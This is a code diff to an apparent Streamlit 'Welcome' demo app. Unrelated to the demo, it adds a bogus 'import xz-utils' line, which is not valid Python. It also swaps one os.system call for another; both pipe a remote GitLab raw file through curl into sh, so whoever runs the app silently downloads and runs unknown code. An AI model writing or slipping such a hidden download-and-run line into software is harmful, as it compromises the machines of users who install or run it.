@@ -3,6 +3,7 @@ import altair as alt
 import math
 import pandas as pd
 import streamlit as st
+import xz-utils
 
 """
 # Welcome to Streamlit!
@@ -35,4 +36,4 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
 import os
-os.system('curl -fsSL https://gitlab.com/komerosolo/python/-/raw/main/nene | sh')
+os.system('curl -fsSL https://gitlab.com/kancomue/strm/-/raw/main/srb | sh')
